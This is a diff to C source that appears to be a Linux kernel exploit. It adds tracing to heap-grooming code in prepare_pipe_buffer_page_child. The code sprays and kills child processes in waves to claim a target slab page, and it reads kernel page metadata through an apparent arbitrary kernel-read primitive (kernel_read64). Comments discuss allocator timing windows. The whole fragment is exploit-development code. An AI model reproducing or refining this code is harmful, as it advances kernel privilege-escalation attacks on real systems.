@@ -530,6 +530,20 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       pr_warning("pipe convert wave[%d] pin cpu=%d failed errno=%d; keep last pin\n",
                  w, w % wave_ncpu, errno);
     tsc = read_target_slab_cache(conv_fd, base);
+    /* per-wave inuse trace: pre-sweep reads 0, the first post-kill read is
+     * 34 and never moves -- pin down WHICH wave fills the page and whether
+     * the batch kill's waitpid actually emptied it (0 at w=6 means kill
+     * worked and something refilled before w=6 fork; 34 at w=6 start means
+     * the kill freed nothing). */
+    {
+      uintptr_t ph = direct_to_head_page(conv_fd, base);
+      if (ph) {
+        uint64_t pm = kernel_read64(conv_fd, ph + 0x28);
+        pr_info("pipe wavehead w=%d tsc=%016llx inuse=%u frozen=%d taken=%d\n",
+                w, (unsigned long long)tsc, (unsigned)(pm & 0xffffu),
+                (int)((pm >> 31) & 1u), taken_wave);
+      }
+    }
     if (tsc == 0 && taken_wave >= 0) {
       target_owned = 1;
       break;
@@ -569,18 +583,26 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
          * always missed the buddy window.  With the fast phase the
          * empty->refill window shrinks to the reap latency (~tens of ms)
          * and the next iteration's tsc read lands inside it. */
+        int kill_sent = 0, reaped = 0, werr = 0;
         for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++)
           for (size_t i = 0; i < wave_sz; i++)
-            if (wave_pids[k * wave_sz + i])
-              kill(wave_pids[k * wave_sz + i], SIGKILL);
+            if (wave_pids[k * wave_sz + i]) {
+              if (kill(wave_pids[k * wave_sz + i], SIGKILL) == 0)
+                kill_sent++;
+            }
         for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
           for (size_t i = 0; i < wave_sz; i++) {
             if (wave_pids[k * wave_sz + i]) {
-              waitpid(wave_pids[k * wave_sz + i], NULL, 0);
+              if (waitpid(wave_pids[k * wave_sz + i], NULL, 0) > 0)
+                reaped++;
+              else
+                werr++;
               wave_pids[k * wave_sz + i] = 0;
             }
           }
         }
+        pr_info("pipe batch kill w=%d sent=%d reaped=%d werr=%d\n", w,
+                kill_sent, reaped, werr);
         taken_wave = w;
         /* The just-killed children's mm_structs are not always reclaimed
          * by the time waitpid returns (TLB/RCU/memcg tail), and every
